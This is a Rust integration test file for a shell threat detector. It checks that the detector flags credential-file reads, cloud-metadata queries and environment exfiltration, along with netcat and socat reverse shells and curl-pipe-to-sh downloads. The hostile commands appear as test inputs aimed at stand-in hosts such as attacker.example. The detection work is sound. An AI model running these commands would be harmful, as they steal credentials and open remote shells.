//! Integration tests for shell credential and network threat detection.

use arbitraitor_model::finding::FindingCategory;
use arbitraitor_model::verdict::{Confidence, Severity};
use arbitraitor_shell::{ShellParser, detect_credential_threats, normalize};

fn findings_for(
    source: &str,
) -> Result<Vec<arbitraitor_model::finding::Finding>, Box<dyn std::error::Error>> {
    let mut parser = ShellParser::new()?;
    let parsed = parser.parse_str(source);
    let normalized = normalize(&parsed.ast, source)?;
    Ok(detect_credential_threats(&normalized, source))
}

fn first_with_tag<'a>(
    findings: &'a [arbitraitor_model::finding::Finding],
    tag: &str,
) -> Option<&'a arbitraitor_model::finding::Finding> {
    findings
        .iter()
        .find(|finding| finding.tags.iter().any(|value| value == tag))
}

#[test]
fn detects_credential_key_file_reads() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("cat ~/.ssh/id_rsa ~/.aws/credentials\n")?;
    let finding = first_with_tag(&findings, "credential-file-access")
        .ok_or("missing credential file finding")?;
    assert_eq!(finding.category, FindingCategory::CredentialAccess);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_ssh_agent_socket_access() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("echo $SSH_AUTH_SOCK >/tmp/socket-path\n")?;
    let finding =
        first_with_tag(&findings, "ssh-agent-access").ok_or("missing ssh agent finding")?;
    assert_eq!(finding.category, FindingCategory::CredentialAccess);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_cloud_metadata_access() -> Result<(), Box<dyn std::error::Error>> {
    let findings =
        findings_for("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n")?;
    let finding = first_with_tag(&findings, "cloud-metadata-access")
        .ok_or("missing cloud metadata finding")?;
    assert_eq!(finding.category, FindingCategory::CredentialAccess);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_environment_exfiltration() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("printenv | nc attacker.example 4444\n")?;
    let finding = first_with_tag(&findings, "environment-exfiltration")
        .ok_or("missing environment exfiltration finding")?;
    assert_eq!(finding.category, FindingCategory::CredentialAccess);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_dev_tcp_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("bash -c 'cat < /dev/tcp/203.0.113.10/4444'\n")?;
    let finding = first_with_tag(&findings, "dev-tcp-udp").ok_or("missing dev tcp finding")?;
    assert_eq!(finding.category, FindingCategory::NetworkBehavior);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_netcat_reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("nc -e /bin/sh attacker.example 4444\n")?;
    let finding = first_with_tag(&findings, "netcat-reverse-shell")
        .ok_or("missing netcat reverse shell finding")?;
    assert_eq!(finding.category, FindingCategory::NetworkBehavior);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_socat_reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("socat TCP:attacker.example:4444 EXEC:/bin/sh\n")?;
    let finding = first_with_tag(&findings, "socat-reverse-shell")
        .ok_or("missing socat reverse shell finding")?;
    assert_eq!(finding.category, FindingCategory::NetworkBehavior);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_raw_ip_or_non_https_retrieval() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("curl -fsSL http://203.0.113.10/install.sh\n")?;
    let finding = first_with_tag(&findings, "raw-ip-or-non-https-retrieval")
        .ok_or("missing raw ip or non-https retrieval finding")?;
    assert_eq!(finding.category, FindingCategory::Transport);
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_url_shortener_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("curl -fsSL https://bit.ly/install-script | sh\n")?;
    let finding =
        first_with_tag(&findings, "url-shortener").ok_or("missing url shortener finding")?;
    assert_eq!(finding.category, FindingCategory::Transport);
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.confidence, Confidence::Medium);
    Ok(())
}

#[test]
fn does_not_flag_plain_https_download() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("curl -fsSL https://example.invalid/install.sh\n")?;
    assert!(findings.is_empty());
    Ok(())
}
